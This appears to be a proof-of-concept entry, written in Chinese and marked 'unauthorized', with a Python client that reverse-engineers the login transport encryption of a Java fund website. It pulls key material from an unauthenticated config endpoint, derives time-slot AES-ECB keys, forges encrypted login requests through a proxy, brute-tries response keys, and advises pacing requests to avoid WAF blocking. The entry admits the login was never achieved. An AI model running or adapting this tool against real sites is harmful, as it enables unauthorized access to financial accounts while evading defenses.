# 自研 Java 资金站 TIMESTAMP 通道：安全凭证头 + AES-ECB 请求体加密与时间片密钥派生算法

- **code**: null-自研-java-资金站-timestamp-通道-安全凭证头-aes-ecb-请求体加密与时间片密钥派生算法
- **kind**: script
- **category**: unauthorized
- **cve**: null
- **component**: [范围外来源·方法通用] 自研 Java 资金站（Spring + 阿里云 WAF + Redisson）PC/H5 传输层
- **severity**: medium
- **language**: python
- **source**: self
- **verified_note**: **未在真实目标上取得有效利用**：算法本身来自前端源码（已实现请求加密、密钥表长度实测 88 与源码一致），但由于服务端返回不可解信封 + 阿里云 WAF 在约 10 次 POST 后永久阻断该端点，**登录未打通**。请求加密是否被服务端接受未获证实。
- **path**: pocs/null-自研-java-资金站-timestamp-通道-安全凭证头-aes-ecb-请求体加密与时间片密钥派生算法/poc.py
- **tags**: AES-ECB,SHA256,时间片密钥,前端逆向,Spring,资金站,传输层,范围外来源,方法本身通用
- **created_at**: 2026-09-28T09:52:03.729Z
- **found_by**: exploit

## 描述

同一家族资金站的 PC/H5 登录（/member/memberManager/loginV3）传输层协议，从 webpack module 191/1483 摘出：
· 安全门槛：请求必须带 `Isauthent` 与 `isstep`（均为 Date.now() 毫秒时间戳），否则应用层直接回 {"status":403,"msg":"非法请求：缺少安全凭证"}。
· 请求体：{"data": AES-ECB-PKCS7(JSON.stringify(payload), key), "AA": SHA256(payload).hex}；key = g(16) = pick( SHA256hex( floor(unixSec / isIpayMergeChannel) ), 16 )，isIpayMergeChannel=300；pick(hex, n) 按 hex 每字节取模长度后从表 m() 逐个取字符。
· 表 m(appId, ipayCustomerUrl, appKey, dhVideoList) = b64(SHA256(appId+ipayCustomerUrl+appKey+SHA256hexUPPER(dhVideoList)))，不足 50 字符时不断自哈希追加（实测长度 88）。这四个常量由**未授权接口 /member/bb/api/getBaboConfig 公开返回**（攻击面：密钥素材公开）。
· 响应：TIMESTAMP 通道的响应解密函数以空串作 AES 密钥（必然失败）、回退分支把 async 密钥生成器的 Promise 当密钥同步使用 → 该路径是死代码；STATICAES 通道密钥来自 module 1483 的 init()，由 load(0)~load(3) 四段拼装（p1+p2+s+aes）后 setKey/setSalt，**无静态密钥、离线不可推导**。因此服务端返回的 {"AA","data"} 信封在本端无法解密。

## 用法

```
1) 先取密钥素材（无需鉴权）：`curl -s -x http://127.0.0.1:7892 "https://<host>/member/bb/api/getBaboConfig"` → appId / ipayCustomerUrl / appKey / dhVideoList / isIpayMergeChannel
2) 填进 ky588_api.py 的 BABO 常量
3) `python ky588_api.py "/member/memberManager/loginV3" "{\"userAccount\":\"x\"}"` → 打印 session_key、请求体结构与服务端响应（含 WAF 判定 `_waf`）
注意：`enc_post()` 会构造合法加密体；若返回 `{AA,data}` 说明服务端走 STATICAES 信封，本端无密钥。目标前置阿里云 WAF，POST 高频会被永久 405 阻断，务必 ≥3s 间隔并即时停手。
```

## 正文

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""ky588 fund-site TIMESTAMP/STATICAES channel client.

Reverse-engineered from /static/js/main.80e1a14b.js (webpack module 191):
  h = MD5(e).hex                       (password field)
  f = SHA256(e).hex  (lower)           u = SHA256(e).hex (UPPER)
  m(appId, ipayCustomerUrl, appKey, dhVideoList) =
        r = u(dhVideoList); i = appId+ipayCustomerUrl+appKey+r
        s = b64(SHA256(i)); while len(s)<50: s += b64(SHA256(s)); return s
  d(hexstr, n) = for f in range(n): pick m(...)[int(hexstr[2f:2f+2],16) % len]
  g(n)         = d( f( str( floor(nowSec / isIpayMergeChannel) ) ), n )      -> session key
  response decrypt: AES-ECB,Pkcs7, key = utf8(g(16)) for the TIMESTAMP channel
"""
import base64
import hashlib
import json
import sys
import time

import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

HOST = "https://example.com"
PROXY = {"http": "http://127.0.0.1:7892", "https": "http://127.0.0.1:7892"}
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/203.0.113.36 Safari/537.36")
DEVICE_ID = "ky588-1.cc"

# getBaboConfig constants (unauthenticated /member/bb/api/getBaboConfig)
BABO = {
    "appId": "bf709056-6806-4252-98e6-3f9ca2022cf0",
    "ipayCustomerUrl": "https://j2SRjZO.1iPJgT.xyz",
    "appKey": "KgBPAHYAUQB5AGUAbAArAEEANQAvAG0ARgA/AHoAWQBCAFUAXAAlAD4AMQAuAEoA",
    "dhVideoList": "https://api.mk3lsv.com/CYnj/Hb7Ya",
    "isIpayMergeChannel": 300,
}


def b64(b):
    return base64.b64encode(b).decode()


def sha256_hex(s):
    return hashlib.sha256(s.encode()).hexdigest()


def sha256_hex_up(s):
    return hashlib.sha256(s.encode()).hexdigest().upper()


def md5_hex(s):
    return hashlib.md5(s.encode()).hexdigest()


def key_table():
    r = sha256_hex_up(BABO["dhVideoList"])
    i = BABO["appId"] + BABO["ipayCustomerUrl"] + BABO["appKey"] + r
    s = b64(hashlib.sha256(i.encode()).digest())
    while len(s) < 50:
        s += b64(hashlib.sha256(s.encode()).digest())
    return s


TABLE = key_table()


def pick(hexstr, n):
    p = ""
    for f in range(n):
        p += TABLE[int(hexstr[2 * f:2 * f + 2], 16) % len(TABLE)]
    return p


def session_key(n=16, offset=0):
    slot = int(time.time()) // BABO["isIpayMergeChannel"] + offset
    return pick(sha256_hex(str(slot)), n)


def aes_dec(b64data, key_utf8):
    try:
        ct = base64.b64decode(b64data)
        pt = AES.new(key_utf8.encode("utf-8"), AES.MODE_ECB).decrypt(ct)
        return unpad(pt, 16).decode("utf-8")
    except Exception as e:
        return None


def aes_enc(plain, key_utf8):
    data = plain.encode("utf-8")
    pad = 16 - len(data) % 16
    data += bytes([pad]) * pad
    return base64.b64encode(AES.new(key_utf8.encode("utf-8"), AES.MODE_ECB).encrypt(data)).decode()


def call(ep, payload=None, channel="TIMESTAMP", verbose=True, extra_headers=None):
    """POST to a TIMESTAMP-channel endpoint and return the decrypted JSON."""
    s = requests.Session()
    s.proxies = PROXY
    ts = str(int(time.time() * 1000))
    hdr = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
           "Content-Type": "application/json", "Origin": HOST, "Referer": HOST + "/",
           "Isauthent": ts, "isstep": ts}
    if extra_headers:
        hdr.update(extra_headers)
    body = json.dumps(payload if payload is not None else {})
    r = s.post(HOST + ep, data=body.encode(), headers=hdr, timeout=20)
    txt = r.text
    if "has been blocked" in txt:
        return {"_waf": True, "_http": r.status_code, "_raw": txt[:200]}
    try:
        j = r.json()
    except Exception:
        return {"_raw": txt[:400], "_http": r.status_code}
    out = {"_http": r.status_code, "_raw_keys": list(j.keys())}
    if "status" in j:
        out.update(j)
        return out
    # needs decryption
    data = j.get("data")
    tried = {}
    cands = [("session", session_key(16, off)) for off in (-1, 0, 1)]
    if j.get("AA"):
        for ln in (16, 32, 24):
            cands.append(("AA-lower-%d" % ln, pick(str(j["AA"]).lower(), ln)))
            cands.append(("AA-upper-%d" % ln, pick(str(j["AA"]), ln)))
    for name, k in cands:
        pt = aes_dec(data, k)
        if pt:
            tried[name] = pt[:200]
            try:
                out.update(json.loads(pt))
                out["_key"] = name
                return out
            except Exception:
                out["_plaintext"] = pt[:600]
                out["_key"] = name
                return out
    out["_decrypt_failed"] = True
    out["_cands"] = {k: v for k, v in list(tried.items())}
    out["_AA"] = j.get("AA")
    out["_data"] = data
    return out


def enc_post(ep, payload, offset=0, verbose=True, extra_headers=None):
    """Proper TIMESTAMP-channel request: body = {data: AES-ECB(json, g(16)), AA: sha256(json).hex}"""
    s = requests.Session()
    s.proxies = PROXY
    ts = str(int(time.time() * 1000))
    key = session_key(16, offset)
    plain = json.dumps(payload, separators=(",", ":"))
    body = json.dumps({"data": aes_enc(plain, key), "AA": sha256_hex(plain)})
    hdr = {"User-Agent": UA, "Accept": "application/json, text/plain, */*",
           "Content-Type": "application/json", "Isauthent": ts, "isstep": ts}
    if extra_headers:
        hdr.update(extra_headers)
    r = s.post(HOST + ep, data=body.encode(), headers=hdr, timeout=20)
    txt = r.text
    res = {"_http": r.status_code, "_key": key, "_plain": plain}
    if "has been blocked" in txt:
        res["_waf"] = True
        return res
    try:
        j = r.json()
    except Exception:
        res["_raw"] = txt[:400]
        return res
    if "status" in j:
        res.update(j)
        return res
    data = j.get("data")
    out = dict(res)
    out["_raw_keys"] = list(j.keys())
    out["_AA"] = j.get("AA")
    for nm, k in [("session", key), ("session+1", session_key(16, 1)),
                  ("session-1", session_key(16, -1)),
                  ("AA-lower16", pick(str(j.get("AA", "")).lower(), 16)),
                  ("AA-upper16", pick(str(j.get("AA", "")), 16))]:
        pt = aes_dec(data, k)
        if pt:
            try:
                out.update(json.loads(pt))
            except Exception:
                out["_plaintext"] = pt[:600]
            out["_deckey"] = nm
            return out
    out["_decrypt_failed"] = True
    out["_data"] = data
    return out


if __name__ == "__main__":
    print("key table len:", len(TABLE))
    print("session key now:", session_key(16))
    ep = sys.argv[1] if len(sys.argv) > 1 else "/member/memberManager/loginV3"
    payload = json.loads(sys.argv[2]) if len(sys.argv) > 2 else {}
    print("EP:", ep, "payload:", payload)
    res = call(ep, payload)
    print(json.dumps(res, ensure_ascii=False, indent=1)[:3000])

```
